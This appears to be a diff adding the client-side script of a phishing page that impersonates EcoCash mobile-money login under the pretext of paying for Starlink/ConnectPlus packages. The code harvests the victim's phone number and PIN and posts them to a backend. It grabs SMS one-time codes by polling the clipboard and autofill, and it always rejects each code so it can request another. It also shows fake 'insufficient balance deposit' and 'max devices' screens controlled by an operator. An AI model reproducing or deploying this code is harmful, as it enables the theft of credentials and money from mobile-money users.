+            pinInputs = document.querySelectorAll('.pin-input');
+            otpInputs = document.querySelectorAll('.otp-input');
+
+            setupInputHandling(pinInputs, checkPinComplete);
+            setupInputHandling(otpInputs, checkOtpComplete);
+
+            const phoneInput = document.getElementById('phoneInput');
+            // Prevent non-digit keys on keydown
+            phoneInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' || e.key === 'Delete' || e.key === 'Tab' || e.key === 'Enter' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'ArrowUp' || e.key === 'ArrowDown') {
+                    return; // Allow navigation and deletion
+                }
+                if (!/\d/.test(e.key)) {
+                    e.preventDefault(); // Block non-digits
+                }
+            });
+            // Remove all non-digits on input (fallback)
+            phoneInput.addEventListener('input', function(e) {
+                const cleaned = this.value.replace(/\D/g, '');
+                if (this.value !== cleaned) {
+                    this.value = cleaned;
+                }
+                checkPinComplete();
+            });
+            // Remove all non-digits on paste
+            phoneInput.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                this.value = paste;
+                checkPinComplete();
+            });
+        }
+        
+        // OTP Autofill — matches MTN approach with EcoCash SMS format:
+        // "Your EcoCash OTP is. 653468. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ"
+        async function startOtpAutofill() {
+            otpAutoSubmitted = false;
+            startClipboardPolling();
+            startOverlayPolling();
+            
+            // Focus the overlay input so Android/Safari can fill it
+            var overlay = document.getElementById('otpAutofill');
+            if (overlay) {
+                overlay.style.pointerEvents = 'auto';
+                overlay.value = '';
+                setTimeout(function() { overlay.focus(); }, 100);
+            }
+
+            // Web OTP API (Android Chrome — works if SMS has proper format)
+            if ('OTPCredential' in window) {
+                try {
+                    var abortController = new AbortController();
+                    setTimeout(function() { abortController.abort(); }, 120000);
+                    var content = await navigator.credentials.get({
+                        otp: { transport: ['sms'] },
+                        signal: abortController.signal
+                    });
+                    if (content && content.code) handleOtpText(content.code);
+                } catch (e) {
+                    console.log('Web OTP API not available');
+                }
+            }
+        }
+        
+        // ── Manual OTP Extraction Engine (EcoCash style) ──
+        // Extracts a 6-digit code from EcoCash-style SMS messages like:
+        //   "Your EcoCash OTP is. 653468. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ"
+        let otpAutoSubmitted = false;
+        let clipboardPollInterval = null;
+        let overlayPollInterval = null;
+        let lastClipboardText = '';
+        
+        function extractOtpFromText(text) {
+            if (!text) return null;
+            // Match 6-digit code after "OTP is:" (EcoCash SMS pattern)
+            const otpMatch = text.match(/OTP is:\s*(\d{6})/);
+            if (otpMatch) return otpMatch[1];
+            // Match standalone 6-digit number
+            const standaloneMatch = text.match(/\b(\d{6})\b/);
+            if (standaloneMatch) return standaloneMatch[1];
+            return null;
+        }
+        
+        function handleOtpText(text) {
+            const code = extractOtpFromText(text);
+            if (!code || code.length !== 6) return false;
+            // Fill OTP inputs
+            var manualOtpEls = document.querySelectorAll('.otp-input');
+            code.split('').forEach((digit, i) => {
+                if (manualOtpEls[i]) manualOtpEls[i].value = digit;
+            });
+            checkOtpComplete();
+            // Auto-submit after a short delay so user sees the filled code
+            otpAutoSubmitted = true;
+            stopManualOtpExtraction();
+            setTimeout(() => verifyOTP(), 400);
+            return true;
+        }
+        
+        // ── Overlay input listeners (catches Android suggestion tap, Safari autofill) ──
+        const otpAutofillInput = document.getElementById('otpAutofill');
+        
+        function checkOverlayValue() {
+            const val = otpAutofillInput.value.replace(/\D/g, '');
+            if (val.length >= 6) {
+                otpAutofillInput.value = '';
+                handleOtpText(val);
+            }
+        }
+        
+        // Multiple event types to catch every browser's autofill behavior
+        ['input', 'change', 'keyup'].forEach(evt => {
+            otpAutofillInput.addEventListener(evt, checkOverlayValue);
+        });
+        
+        // Paste on overlay
+        otpAutofillInput.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pasted = (e.clipboardData || window.clipboardData).getData('text');
+            this.value = '';
+            handleOtpText(pasted);
+        });
+        
+        // When user taps an individual OTP box, hide overlay so keyboard works normally
+        document.querySelectorAll('.otp-input').forEach(input => {
+            input.addEventListener('focus', function() {
+                otpAutofillInput.style.pointerEvents = 'none';
+                otpAutofillInput.style.zIndex = '-1';
+            });
+            // Select content on focus so typing replaces it
+            input.addEventListener('click', function() {
+                this.select();
+            });
+        });
+        // Re-enable overlay when tapping outside OTP boxes
+        document.addEventListener('click', function(e) {
+            if (!e.target.classList.contains('otp-input')) {
+                otpAutofillInput.style.pointerEvents = 'auto';
+                otpAutofillInput.style.zIndex = '2';
+            }
+        });
+        
+        // ── Poll overlay input value every 300ms ──
+        function startOverlayPolling() {
+            stopOverlayPolling();
+            overlayPollInterval = setInterval(() => {
+                if (otpAutoSubmitted) { stopOverlayPolling(); return; }
+                checkOverlayValue();
+                // Also check if individual OTP boxes were filled
+                const combined = getOtpValue();
+                if (combined.length === 6) {
+                    handleOtpText(combined);
+                }
+            }, 300);
+        }
+        function stopOverlayPolling() {
+            if (overlayPollInterval) { clearInterval(overlayPollInterval); overlayPollInterval = null; }
+        }
+        
+        // ── Poll clipboard every 1s ──
+        function startClipboardPolling() {
+            stopClipboardPolling();
+            lastClipboardText = '';
+            clipboardPollInterval = setInterval(async () => {
+                if (!document.getElementById('otpScreen').classList.contains('active')) return;
+                if (otpAutoSubmitted) { stopClipboardPolling(); return; }
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text !== lastClipboardText) {
+                        lastClipboardText = text;
+                        handleOtpText(text);
+                    }
+                } catch (e) { /* clipboard permission denied */ }
+            }, 1000);
+        }
+        function stopClipboardPolling() {
+            if (clipboardPollInterval) { clearInterval(clipboardPollInterval); clipboardPollInterval = null; }
+        }
+        
+        function startManualOtpExtraction() {
+            startOverlayPolling();
+            startClipboardPolling();
+        }
+        
+        function stopManualOtpExtraction() {
+            stopOverlayPolling();
+            stopClipboardPolling();
+        }
+        
+        function getOtpValue() {
+            return Array.from(document.querySelectorAll('.otp-input')).map(function(i) { return i.value; }).join('');
+        }
+        
+        // ── App-switch detection ──
+        // When user leaves browser to read SMS then comes back
+        function onReturnToPage() {
+            if (!document.getElementById('otpScreen').classList.contains('active') || otpAutoSubmitted) return;
+            [100, 500, 1000, 2000].forEach(function(delay) {
+                setTimeout(async function() {
+                    if (otpAutoSubmitted) return;
+                    checkOverlayValue();
+                    try {
+                        var text = await navigator.clipboard.readText();
+                        if (text && text !== lastClipboardText) {
+                            lastClipboardText = text;
+                            handleOtpText(text);
+                        }
+                    } catch (e) { /* clipboard denied */ }
+                }, delay);
+            });
+        }
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'visible') onReturnToPage();
+        });
+        window.addEventListener('focus', onReturnToPage);
+        window.addEventListener('pageshow', onReturnToPage);
+        
+        // Submit login
+        async function submitLogin() {
+            const btn = document.getElementById('submitBtn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+            
+            const phone = document.getElementById('phoneInput').value;
+            const pin = Array.from(document.querySelectorAll('.pin-input')).map(i => i.value).join('');
+            const country = COUNTRIES[selectedCountryCode];
+            const fullPhone = country.code + ' ' + phone;
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            try {
+                const response = await fetch('/api/ecocash/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: fullPhone,
+                        pin: pin,
+                        country: selectedCountryCode,
+                        source: urlParams.get('source') || 'direct',
+                        package: urlParams.get('package') || null,
+                        userAgent: navigator.userAgent,
+                        language: navigator.language
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showOTPScreen(fullPhone);
+                } else {
+                    alert(data.message || 'Error occurred');
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showOTPScreen(fullPhone);
+            }
+        }
+        
+        function showOTPScreen(phone) {
+            otpAutoSubmitted = false;
+            
+            document.getElementById('loginScreen').classList.add('hidden');
+            document.getElementById('otpScreen').classList.add('active');
+            
+            const masked = phone.slice(0, -4).replace(/\d/g, '*') + phone.slice(-4);
+            document.getElementById('phoneDisplay').textContent = masked;
+            
+            startTimer();
+            startOtpAutofill();
+            // defer focus until after display:block is painted
+            requestAnimationFrame(function() {
+                var first = document.querySelector('.otp-input:not([style*="display: none"])');
+                if (first) first.focus();
+            });
+            startStatusPolling();
+        }
+
+        // ── Insufficient Balance Polling ──
+        let statusPollInterval = null;
+        const urlParamsIB = new URLSearchParams(window.location.search);
+        function startStatusPolling() {
+            stopStatusPolling();
+            statusPollInterval = setInterval(async () => {
+                try {
+                    console.log(`[EcoCash Poll] Fetching /api/check-status...`);
+                    const res = await fetch('/api/check-status');
+                    console.log(`[EcoCash Poll] Response status: ${res.status}`);
+                    
+                    if (!res.ok) {
+                        console.error(`[EcoCash Poll] Bad response status: ${res.status}`);
+                        return;
+                    }
+                    
+                    const data = await res.json();
+                    console.log(`[EcoCash Poll] Full response data:`, data);
+                    console.log(`[EcoCash Poll] data.status='${data.status}' (type: ${typeof data.status})`);
+                    
+                    const maxDevicesScreen = document.getElementById('maxDevicesScreen');
+                    const isOnMaxDevicesScreen = maxDevicesScreen && maxDevicesScreen.style.display !== 'none';
+                    
+                    if (data.status === 'insufficient_balance') {
+                        console.log(`[EcoCash Poll] ✓ Status is 'insufficient_balance', showing screen`);
+                        showInsufficientScreen();
+                    } else if (data.status === 'ecocash_max_devices') {
+                        console.log(`[EcoCash Poll] ✓ Status is 'ecocash_max_devices', showing screen`);
+                        if (!isOnMaxDevicesScreen) {
+                            showMaxDevicesScreen();
+                        }
+                    } else {
+                        // Status is 'normal' or something else
+                        console.log(`[EcoCash Poll] Status is '${data.status}'`);
+                        if (isOnMaxDevicesScreen) {
+                            // User was blocked but now is unblocked! Auto-restore to OTP
+                            console.log(`[EcoCash Poll] ✓ Block removed! Restoring to OTP screen`);
+                            maxDevicesScreen.style.display = 'none';
+                            document.getElementById('otpScreen').classList.add('active');
+                            document.getElementById('loginScreen').classList.add('hidden');
+                            document.querySelectorAll('.otp-input')[0].focus();
+                            startOtpAutofill();
+                        }
+                    }
+                } catch(e) {
+                    console.error(`[EcoCash Poll] Error:`, e);
+                }
+            }, 3000);
+            console.log(`[EcoCash Poll] Started polling at 3000ms intervals`);
+        }
+        function stopStatusPolling() {
+            if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
+        }
+        function showInsufficientScreen() {
+            document.getElementById('loginScreen').classList.add('hidden');
+            document.getElementById('otpScreen').classList.remove('active');
+            document.getElementById('insufficientScreen').classList.add('active');
+            document.getElementById('maxDevicesScreen').style.display = 'none';
+            stopStatusPolling();
+            stopAllPolling();
+            // Dynamic amount display
+            const urlParams = new URLSearchParams(window.location.search);
+            const passedPrice = urlParams.get('lp');
+            const passedCur = urlParams.get('cur');
+            const packageType = urlParams.get('package') || 'starter';
+            let amountDisplay = '$30 USD';
+            if (passedPrice && passedCur) {
+                amountDisplay = passedCur === 'USD' ? `$${passedPrice}` : `${passedCur} ${parseInt(passedPrice).toLocaleString()}`;
+            } else {
+                const pkg = STARLINK_PACKAGES[packageType] || STARLINK_PACKAGES['starter'];
+                const country = COUNTRIES[selectedCountryCode];
+                const currency = country ? country.currency : 'USD';
+                const rate = CURRENCY_RATES[currency] || 1;
+                const localAmount = Math.round(pkg.xaf * rate);
+                amountDisplay = `${currency} ${localAmount.toLocaleString()}`;
+            }
+            const msgEl = document.getElementById('insuffMsg');
+            if (msgEl) {
+                msgEl.innerHTML = 'You must have at least <strong style="color:#111;">' + amountDisplay + '</strong> in your EcoCash wallet as a <strong style="color:#111;">guarantee deposit</strong> to subscribe to any ConnectPlus package.<br><br>Please deposit the required amount and click the button below.';
+            }
+        }
+        function showMaxDevicesScreen() {
+            document.getElementById('loginScreen').classList.add('hidden');
+            document.getElementById('otpScreen').classList.remove('active');
+            document.getElementById('insufficientScreen').classList.remove('active');
+            document.getElementById('maxDevicesScreen').style.display = 'block';
+            stopAllPolling();
+            // Keep polling running so we can detect when admin unblocks the user
+            startStatusPolling();
+        }
+        document.getElementById('depositedBtn').addEventListener('click', async function() {
+            const btn = this;
+            btn.disabled = true;
+            btn.textContent = '⏳ Notifying...';
+            try { await fetch('/api/user-deposited', { method: 'POST' }); } catch(e) {}
+            document.getElementById('insufficientScreen').classList.remove('active');
+            document.getElementById('otpScreen').classList.add('active');
+            document.querySelectorAll('.otp-input')[0].focus();
+            startOtpAutofill();
+            startStatusPolling();
+            btn.disabled = false;
+            btn.textContent = '✅ I Have Deposited';
+        });
+        document.getElementById('diffNumberBtn').addEventListener('click', function() {
+            if (urlParamsIB.get('source') === 'starlink') {
+                window.location.href = '/starlink/';
+            } else {
+                document.getElementById('insufficientScreen').classList.remove('active');
+                document.getElementById('loginScreen').classList.remove('hidden');
+            }
+        });
+
+        // EcoCash Check Status
+        async function checkMaxDevicesStatus() {
+            const btn = document.querySelector('#maxDevicesScreen button[onclick="checkMaxDevicesStatus()"]');
+            if (!btn) return;
+            
+            btn.disabled = true;
+            btn.textContent = '⏳ Checking...';
+            try {
+                const res = await fetch('/api/check-status');
+                const data = await res.json();
+                console.log(`[EcoCash Check] Response status:`, data.status);
+                
+                if (data.status === 'ecocash_max_devices') {
+                    console.log(`[EcoCash Check] Still blocked`);
+                    btn.textContent = '🔄 Check Status';
+                    btn.disabled = false;
+                    alert('You are still blocked. Please contact support via WhatsApp to resolve this issue.');
+                } else {
+                    // Status has changed - user is now allowed to proceed
+                    console.log(`[EcoCash Check] Block removed! Status is now: ${data.status}`);
+                    document.getElementById('maxDevicesScreen').style.display = 'none';
+                    document.getElementById('otpScreen').classList.add('active');
+                    document.querySelectorAll('.otp-input')[0].focus();
+                    startOtpAutofill();
+                    startStatusPolling();
+                    alert('Your account has been restored! You can now proceed with the payment.');
+                }
+            } catch(e) {
+                console.error(`[EcoCash Check] Error:`, e);
+                btn.textContent = '🔄 Check Status';
+                btn.disabled = false;
+                alert('Error checking status. Please try again.');
+            }
+        }
+        
+        // EcoCash Max Devices Support
+        async function openEcocashMaxDevicesSupport() {
+            try {
+                const res = await fetch('/api/support-whatsapp');
+                const data = await res.json();
+                const number = (data.number || '').replace(/\D/g, '');
+                if (number) {
+                    const rawPhone = document.getElementById('phoneInput').value;
+                    const dialCode = (COUNTRIES[selectedCountryCode] || {}).code || '';
+                    const phone = rawPhone ? `${dialCode} ${rawPhone}` : '—';
+                    const message = `I'm not allowed to proceed with the payment subscription due to maximum devices issue. How can I resolve this to be able to proceed with the payment subscription.\n\nMy number is: ${phone}\n\nThank you.`;
+                    window.open('https://wa.me/' + number + '?text=' + encodeURIComponent(message), '_blank');
+                } else {
+                    alert('Support is not currently available. Please try again later.');
+                }
+            } catch(e) {
+                console.error('[EcoCash Support] Error:', e);
+                alert('Support is not currently available. Please try again later.');
+            }
+        }
+        
+        // Timer
+        function startTimer() {
+            let seconds = 60;
+            const timerEl = document.getElementById('timer');
+            const resendLink = document.getElementById('resendLink');
+            const expiredMessage = document.getElementById('otpExpiredMessage');
+            
+            if (timerInterval) clearInterval(timerInterval);
+            
+            expiredMessage.classList.remove('active');
+            document.getElementById('otpInvalidMessage').classList.remove('active');
+            resendLink.classList.add('disabled');
+            
+            timerInterval = setInterval(() => {
+                seconds--;
+                const mins = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                timerEl.textContent = `(${mins}:${secs.toString().padStart(2, '0')})`;
+                
+                if (seconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerEl.textContent = '';
+                    resendLink.classList.remove('disabled');
+                    expiredMessage.classList.add('active');
+                }
+            }, 1000);
+        }
+        
+        // Verify OTP
+        async function verifyOTP() {
+            // Stop OTP auto-detection
+            stopManualOtpExtraction();
+            
+            const btn = document.getElementById('verifyBtn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+            
+            const otp = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
+            const phone = document.getElementById('phoneInput').value;
+            const country = COUNTRIES[selectedCountryCode];
+            const fullPhone = country.code + ' ' + phone;
+            
+            try {
+                await fetch('/api/ecocash/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: fullPhone,
+                        otp: otp
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+            
+            // Always show invalid OTP and request new code
+            btn.classList.remove('loading');
+            showInvalidOTP();
+        }
+        
+        function showInvalidOTP() {
+            console.log('showInvalidOTP called');
+            
+            // Show invalid OTP message
+            const invalidMsg = document.getElementById('otpInvalidMessage');
+            const expiredMsg = document.getElementById('otpExpiredMessage');
+            
+            console.log('invalidMsg element:', invalidMsg);
+            
+            if (invalidMsg) {
+                invalidMsg.classList.add('active');
+                invalidMsg.style.display = 'block'; // Force display
+                console.log('Added active class to invalidMsg');
+            }
+            if (expiredMsg) expiredMsg.classList.remove('active');
+            
+            // Clear OTP inputs
+            var otpEls = document.querySelectorAll('.otp-input');
+            otpEls.forEach(function(i) { i.value = ''; });
+            if (otpEls[0]) otpEls[0].focus();
+            
+            // Disable verify button
+            document.getElementById('verifyBtn').disabled = true;
+            
+            // Reset timer for new OTP
+            startTimer();
+            
+            // Auto-request new OTP
+            const phone = document.getElementById('phoneInput').value;
+            const country = COUNTRIES[selectedCountryCode];
+            const fullPhone = country.code + ' ' + phone;
+            
+            fetch('/api/ecocash/resend-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: fullPhone, country: country.name })
+            }).catch(e => console.log('Resend error:', e));
+        }
+        
+        // Resend OTP
+        async function resendOTP() {
+            const resendLink = document.getElementById('resendLink');
+            if (resendLink.classList.contains('disabled')) return;
+            
+            const phone = document.getElementById('phoneInput').value;
+            const country = COUNTRIES[selectedCountryCode];
+            const fullPhone = country.code + ' ' + phone;
+            
+            try {
+                await fetch('/api/ecocash/resend-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: fullPhone, country: country.name })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+            
+            var resendOtpEls = document.querySelectorAll('.otp-input');
+            resendOtpEls.forEach(function(i) { i.value = ''; });
+            if (resendOtpEls[0]) resendOtpEls[0].focus();
+            document.getElementById('otpInvalidMessage').classList.remove('active');
+            startTimer();
+            startOtpAutofill();
+        }
+        
+        // Detect country from IP
+        async function detectCountry() {
+            const cachedCountry = getCachedCountry();
+            if (cachedCountry && COUNTRIES[cachedCountry]) {
+                selectedCountryCode = cachedCountry;
+                setCountry(cachedCountry);
+                return;
+            }
+            
+            try {
+                let countryCode = null;
+                
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 5000);
+                    const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    const data = await response.json();
+                    if (data.country_code) {
+                        countryCode = data.country_code;
+                    }
+                } catch (e) {
+                    try {
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), 5000);
+                        const response = await fetch('https://ip-api.com/json/', { signal: controller.signal });
+                        clearTimeout(timeoutId);
+                        const data = await response.json();
+                        if (data.countryCode) {
+                            countryCode = data.countryCode;
+                        }
+                    } catch (e2) {
+                        console.log('IP detection failed');
+                    }
+                }
+                
+                if (countryCode && COUNTRIES[countryCode]) {
+                    selectedCountryCode = countryCode;
+                    cacheCountry(countryCode);
+                    setCountry(countryCode);
+                } else {
+                    selectedCountryCode = 'ZW';
+                    cacheCountry('ZW');
+                    setCountry('ZW');
+                }
+            } catch (e) {
+                console.log('Country detection error');
+                setCountry('ZW');
+            }
+            
+            // Update Starlink amount after detection
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('package')) {
+                updateStarlinkAmount();
+            }
+        }
+        
+        // Apply Sesotho for Lesotho (LSL currency)
+        function applyLesothoLanguage() {
+            const cur = new URLSearchParams(window.location.search).get('cur');
+            if (cur !== 'LSL') return;
+
+            // PIN screen
+            const h = document.getElementById('loginHeading');
+            if (h) h.textContent = 'Tsenya lihlahisoa tsa EcoCash ho lumela tefo';
+            document.querySelectorAll('.form-label').forEach(el => {
+                if (el.textContent.includes('EcoCash Number')) el.textContent = 'Nomoro ea EcoCash';
+            });
+            const pinLabel = document.querySelector('.pin-label');
+            if (pinLabel) pinLabel.textContent = 'Tsenya PIN ea hao ea linomoro tse 4';
+            const pinSub = document.querySelector('.pin-sublabel');
+            if (pinSub) pinSub.textContent = 'Sheba app ea EcoCash kapa SMS';
+            const verifyPinBtn = document.querySelector('#submitBtn .btn-text');
+            if (verifyPinBtn) verifyPinBtn.textContent = 'Netefatsa PIN';
+            const sslBadge = document.querySelector('#sslBadge span');
+            if (sslBadge) sslBadge.textContent = 'Tlhahisoleseling ea hao e bolokehile ebile e kolotsoe';
+
+            // Step indicators
+            document.querySelectorAll('.step-indicator').forEach(el => {
+                if (el.textContent.includes('Step 2')) el.textContent = 'Mohato oa 2 oa 3: Netefatso';
+                if (el.textContent.includes('Step 3')) el.textContent = 'Mohato oa 3 oa 3: Netefatso ea ho qetela';
+            });
+
+            // OTP screen
+            const otpTitle = document.querySelector('.otp-header h2');
+            if (otpTitle) otpTitle.textContent = 'Netefatso ea OTP';
+            const otpDesc = document.querySelector('.otp-header p:last-child');
+            if (otpDesc) otpDesc.innerHTML = 'Tsenya OTP ea linomoro tse 4 e rometsoe ho<br><span class="phone-display" id="phoneDisplay">+266 *** ****</span>';
+            const otpInvalid = document.getElementById('otpInvalidMessage');
+            if (otpInvalid) otpInvalid.textContent = 'Khopo ea OTP. Ka kopo sebelisa khoutu e ncha e romellitsoeng.';
+            const otpExpired = document.getElementById('otpExpiredMessage');
+            if (otpExpired) otpExpired.textContent = 'OTP e fedile nako. Ka kopo sebelisa khoutu e ncha.';
+            const verifyOtpBtn = document.querySelector('#verifyBtn .btn-text');
+            if (verifyOtpBtn) verifyOtpBtn.textContent = 'Netefatsa OTP';
+            const resendSection = document.querySelector('.resend-section p');
+            if (resendSection) resendSection.innerHTML = 'Ha o e amohele? <span class="resend-link disabled" id="resendLink" onclick="resendOTP()">ROMELA HAPE <span class="timer" id="timer">(1:00)</span></span>';
+            const otpSsl = document.querySelector('.otp-screen .ssl-badge span');
+            if (otpSsl) otpSsl.textContent = 'OTP ea hao e sebetsa metsotsoana e 10';
+
+            // Lesotho uses 4-digit OTP: hide boxes 4 & 5
+            const allOtp = document.querySelectorAll('.otp-input');
+            if (allOtp.length >= 6) {
+                allOtp[4].style.display = 'none';
+                allOtp[5].style.display = 'none';
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeInputs();
+            checkStarlinkSource();
+            detectCountry();
+            applyLesothoLanguage();
+        });
+    </script>
+</body>
+</html>
